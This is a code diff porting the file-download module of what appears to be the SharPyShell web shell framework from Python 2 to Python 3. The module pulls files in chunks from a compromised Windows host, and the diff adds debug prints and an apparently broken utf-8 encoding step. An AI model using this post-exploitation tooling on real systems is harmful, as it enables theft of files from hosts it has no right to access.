@@ -36,7 +36,7 @@ class Download(Module):
                 #download C:\windows\system32\cmd.exe /home/user/cmd.exe 1024
     """
 
-    _runtime_code = ur"""
+    _runtime_code = r"""
             using System;using System.IO;using System.Diagnostics;using System.Text;
             public class SharPyShell{                    
                 public byte[] Download(string arg){
@@ -56,7 +56,7 @@ class Download(Module):
             }
     """
 
-    __runtime_code_split_file = ur"""
+    __runtime_code_split_file = r"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
                 public class SharPyShell{                    
                     public byte[] Download(string arg, int chunk, int offset){
@@ -79,7 +79,7 @@ class Download(Module):
                 }
         """
 
-    __runtime_code_get_file_size = ur"""
+    __runtime_code_get_file_size = r"""
             using System;using System.IO;using System.Diagnostics;using System.Text;
             public class SharPyShell{                    
                 string GetFileSize(string path){
@@ -111,12 +111,14 @@ class Download(Module):
         return output_file_size
 
     def __write_local_file(self, file_content, output_path, split=False):
+        print(type(file_content))
         if split:
             file_open_mode = 'ab'
         else:
             file_open_mode = 'wb'
+        print(file_open_mode)
         with open(output_path, file_open_mode) as outfile:
-            outfile.write(file_content)
+            outfile.write(bytes(file_content, "utf-8"))
         output = "File Downloaded correctly to " + output_path
         return output
 
@@ -166,8 +168,8 @@ class Download(Module):
                 file_content = self._parse_response(decrypted_response)
                 if len(requests) > 1:
                     parsed_response = self.__write_local_file(file_content, download_output_path, split=True)
-                    print 'Chunk ' + str(i + 1) + ' --> ' + str(chunk_size * i) + ' - ' +\
-                          str(chunk_size * i + chunk_size) + ' bytes written correctly to ' + download_output_path
+                    print ('Chunk ' + str(i + 1) + ' --> ' + str(chunk_size * i) + ' - ' +\
+                          str(chunk_size * i + chunk_size) + ' bytes written correctly to ' + download_output_path)
                 else:
                     parsed_response = self.__write_local_file(file_content, download_output_path)
         except ModuleException as module_exc:
